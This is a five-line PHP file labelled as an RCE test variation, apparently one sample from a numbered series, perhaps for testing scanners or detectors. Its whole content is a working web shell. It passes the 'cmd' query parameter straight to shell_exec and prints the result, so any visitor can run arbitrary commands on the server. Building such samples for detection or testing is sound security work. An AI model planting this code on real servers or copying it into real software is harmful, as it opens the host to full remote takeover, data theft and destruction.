<?php
// RCE test variation #748
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>